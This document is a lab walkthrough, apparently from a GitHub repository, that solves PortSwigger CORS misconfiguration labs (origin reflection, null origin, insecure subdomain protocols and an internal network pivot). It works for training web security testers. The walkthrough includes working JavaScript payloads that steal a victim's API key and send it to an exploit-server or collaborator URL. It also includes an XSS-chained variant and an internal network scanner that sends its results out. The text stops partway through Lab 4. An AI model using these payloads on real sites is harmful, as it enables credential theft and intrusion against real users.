# Cross-origin resource sharing (CORS)

> Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF).

## Lab 1 : CORS vulnerability with basic origin reflection

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

### Sol :

* Log in and access the account page with the `wiener:peter` credentials.

* Go to `http history` and observe that out key is retrieved via an request to `/accountDetails` and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/7996a544-582b-4347-aeb8-9d12fe6e9b6c)

* Send it to the Burp Repeater

* Add header `Origin` and give a example website to check the response

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/1aa6a719-0d7d-487c-9cf7-d01edcf86d7d)

* Observe that the origin is reflected in the `Access-Control-Allow-Origin` header.
* Click on `Go to exploit server` in the lab.
* Give the below script in the body box by giving lab ID of yours.

      <html>
      <body>
          <h1>Hello World!</h1>
          <script>
              var xhr = new XMLHttpRequest();
              var url = "https://ac211f241efad3f2c045255700630006.web-security-academy.net"
              xhr.onreadystatechange = function() {
                  if (xhr.readyState == XMLHttpRequest.DONE){
                      fetch("/log?key=" + xhr.responseText)
                  }
              }

              xhr.open('GET', url + "/accountDetails", true);
              xhr.withCredentials = true;
              xhr.send(null)
          </script>
        </body>
      </html>
      
 * Click `View exploit`. Observe that the exploit works - you have landed on the log page and your API key is in the URL
* Go back to the exploit server and click `Deliver exploit to victim`
* Click `Access log`, retrieve and submit the victim's API key to complete the lab.
* Thus, the lab is solved

## Lab 2: CORS vulnerability with trusted null origin

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

### Sol :

* Log in and access the account page with the `wiener:peter` credentials.

* Go to `http history` and observe that out key is retrieved via an request to `/accountDetails` and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/72c3ad10-9ec4-4598-95a9-deb7ed43ee2f)

* Add header `Origin:null` and check the response

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/bde5d446-1b8c-4e7e-8511-6b633c81b012)

* Observe that the origin is reflected in the `Access-Control-Allow-Origin` header.
* Click on `Go to exploit server` in the lab.
* Give the below script in the body box by giving lab ID and exploit server ID of yours.

      <html>
          <body>
              <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
        <script>
            var xhr = new XMLHttpRequest();
            var url = 'https://ac371f531f693ef3c07b84de00630017.web-security-academy.net'

            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    fetch('https://exploit-0a5f003b04a7814a808be362016b004a.exploit-server.net/log?key=' + xhr.responseText)
                }
            }

            xhr.open('GET', url + '/accountDetails', true);
            xhr.withCredentials = true;
            xhr.send(null);
        </script>"></iframe>
      </body>
      </html>
      
* Click `View exploit`. Observe that the exploit works - you have landed on the log page and your API key is in the URL
* Go back to the exploit server and click `Deliver exploit to victim`
* Click `Access log`, retrieve and submit the victim's API key to complete the lab.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/9673fcc5-71ae-4397-b223-6c3bec36321f)

* Thus, the lab is solved

## Lab 3: CORS vulnerability with trusted insecure protocols

This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

### Sol :

* Log in and access the account page with the `wiener:peter` credentials.

* Go to `http history` and observe that out key is retrieved via an request to `/accountDetails` and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/f8d457f6-c6be-40bd-a5a3-881bea17db20)

* Add header `Origin:https://0a7800f9038eaec68040db6d00650099.web-security-academy.net/` and check the response

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/a928cb08-177a-40af-b29a-2a2d50e743c0)

* Observe that the origin is reflected in the `Access-Control-Allow-Origin header`, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP
* Open a product page, click Check stock and observe that it is loaded using a HTTP URL on a subdomain

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/48766a13-75fa-4b9c-a396-3c935e9fd832)

Now we will check whether the stock check parameters consists of XSS vulnerability.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/94686a06-65bb-4427-950b-dfcd16c78b13)

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/7d9933fa-edae-4a3c-9128-fda415a0f46c)

* As we can see the `productID` parameter is vulnerable to XSS.
* Go to `exploit server` and give the below payload by giving your own Lab ID & exploit server ID.

      <html>
       <body>
        <h1>Hello World!</h1>
        <script>
            document.location="http://stock.0a7800f9038eaec68040db6d00650099.web-security-academy.net/?productId=<script>var xhr = new XMLHttpRequest();var url = 'https://0a7800f9038eaec68040db6d00650099.web-security-academy.net';xhr.onreadystatechange = function(){if (xhr.readyState == XMLHttpRequest.DONE) {fetch('https://exploit-0a5b003703b6ae528095dafd01ef00a0.exploit-server.net//log?key=' %2b xhr.responseText)};};xhr.open('GET', url %2b '/accountDetails', true); xhr.withCredentials = true;xhr.send(null);%3c/script>&storeId=1"
        </script>
      </body>
      </html>

* Click `View exploit`. Observe that the exploit works - you have landed on the log page and your API key is in the URL
* Go back to the exploit server and click `Deliver exploit to victim`
* Click `Access log`, retrieve and submit the victim's API key to complete the lab.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/991ee846-2975-4578-bbfb-66109af6159d)

* Thus, the lab is solved.

## Lab 4: CORS vulnerability with internal network pivot attack

This website has an insecure CORS configuration in that it trusts all internal network origins.

This lab requires multiple steps to complete. To solve the lab, craft some JavaScript to locate an endpoint on the local network (`192.168.0.0/24`, port `8080`) that you can then use to identify and create a CORS-based attack to delete a user. The lab is solved when you delete user `Carlos`

### Sol :

* First we need to scan the local network for the endpoint.
* Enter below payload to scan for the local network(`192.168.0.0/24, 8080`)
* Replace the `collaboratorURL` with your own URL.

        <html>
          <script>
        collaboratorURL = 'http://d4i329wl1e1wjgh7cec94oo51w7mvb.burpcollaborator.net'

        for (let i=0; i<256; i++){
            fetch('http://192.168.0.' + i + ':8080')
            .then(response => response.text())
            .then (text => {
                try {

                fetch(collaboratorURL + '?ip=' + 'http://192.168.0.' + i + "&code=" + encodeURIComponent(text))
                } catch(err){

                }
            })
        }
          </script>
      </html>

* Click Store and click `Deliver exploit to victim`.
* We can see the output at burp collaborator

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/083c84f1-cd5d-4569-874b-07bd3710d119)

* We got the IP as `192.168.0.161`.
* Enter below second payload to check the probing of username field for an XSS vulnerability
* 
